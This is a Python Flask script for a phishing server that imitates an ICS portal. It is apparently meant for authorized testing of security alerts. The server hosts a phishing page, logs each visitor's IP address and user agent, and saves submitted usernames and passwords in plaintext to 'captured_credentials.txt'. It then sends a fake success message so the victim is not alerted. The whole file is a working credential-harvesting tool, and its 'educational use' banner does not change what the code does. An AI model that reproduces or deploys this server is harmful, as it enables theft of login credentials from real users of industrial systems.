#!/usr/bin/env python3
"""
Phishing Server for ICS Portal
Hosts the phishing page and logs credentials
Generates URL filtering alerts when victims access the page

Usage:
    python3 00_phishing_server.py [--port PORT] [--host HOST]
"""

import os
import sys
import argparse
import logging
from datetime import datetime
from flask import Flask, request, render_template_string, jsonify, send_from_directory

app = Flask(__name__)

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler('phishing_log.txt'),
        logging.StreamHandler()
    ]
)

# Read the phishing HTML page
def get_phishing_html():
    """Load the phishing HTML page"""
    try:
        with open('00_phishing_page.html', 'r') as f:
            return f.read()
    except FileNotFoundError:
        return """
        <html>
        <body>
        <h1>Error: Phishing page not found</h1>
        <p>Please ensure 00_phishing_page.html is in the same directory</p>
        </body>
        </html>
        """

@app.route('/')
def index():
    """Serve the phishing page"""
    client_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Unknown')

    logging.info(f"[VISIT] IP: {client_ip} | User-Agent: {user_agent}")

    return get_phishing_html()

@app.route('/login', methods=['POST'])
def login():
    """Handle login submissions (capture credentials)"""
    client_ip = request.remote_addr
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # Log captured credentials
    logging.warning(f"[CREDENTIALS CAPTURED] IP: {client_ip} | Username: {username} | Password: {password}")

    # Save to file
    with open('captured_credentials.txt', 'a') as f:
        f.write(f"{datetime.now().isoformat()} | {client_ip} | {username} | {password}\n")

    # Return success to not alert the victim
    return jsonify({
        'success': True,
        'message': 'Authentication successful'
    })

@app.route('/assets/<path:filename>')
def assets(filename):
    """Serve any additional assets"""
    return send_from_directory('assets', filename)

@app.errorhandler(404)
def not_found(e):
    """Handle 404 errors"""
    logging.warning(f"[404] {request.path} from {request.remote_addr}")
    return "Not Found", 404

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Phishing Server for ICS Portal')
    parser.add_argument('--port', type=int, default=8080, help='Port to listen on (default: 8080)')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to (default: 0.0.0.0)')

    args = parser.parse_args()

    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║              Phishing Server - Educational Use Only           ║
    ╚═══════════════════════════════════════════════════════════════╝

    [!] WARNING: This is for authorized security testing only!

    Server Configuration:
    - Host: {host}:{port}
    - Phishing Page: http://{host}:{port}/

    Expected Security Alerts:
    - URL Filtering: Phishing/Malicious content detection
    - DNS Security: Malicious domain queries from victims
    - WildFire: JavaScript beacon analysis

    Captured credentials will be logged to:
    - phishing_log.txt
    - captured_credentials.txt

    Press Ctrl+C to stop the server
    """.format(host=args.host, port=args.port))

    # Create captured credentials file if it doesn't exist
    if not os.path.exists('captured_credentials.txt'):
        with open('captured_credentials.txt', 'w') as f:
            f.write("# Captured Credentials Log\n")
            f.write("# Timestamp | IP Address | Username | Password\n")

    app.run(host=args.host, port=args.port, debug=False)
